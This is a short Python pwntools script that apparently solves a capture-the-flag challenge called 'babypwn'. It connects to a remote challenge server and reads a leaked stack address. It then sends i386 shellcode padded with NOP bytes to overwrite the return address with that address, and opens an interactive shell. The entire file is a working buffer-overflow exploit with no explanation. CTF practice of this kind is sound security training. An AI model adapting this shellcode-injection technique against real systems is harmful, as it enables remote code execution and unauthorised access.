#!/usr/bin/env python
# coding=utf-8

from pwn import *
from pwn import logging

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context(arch = "i386", os = "linux")

DEBUG = False

def debug(p):
    if DEBUG:
        gdbscript = """
            b *0x8049203
            c
        """
        gdb.attach(p, gdbscript = gdbscript)

if DEBUG:
    p = process("./babypwn")
else:
    p = remote("oakland40ctf.epfl.ch", 40000)

p.recvuntil("You can say whatever you want over here ")
aslr = int(p.recvuntil("\n").strip(), 16)
print "ASLR: %#x" % aslr

debug(p)

payload = asm(shellcraft.i386.sh()).ljust(0x5c, '\x90') + p32(aslr)
p.recvuntil("Think you can convince me to give you the flag?");
p.sendline(payload)


p.interactive()
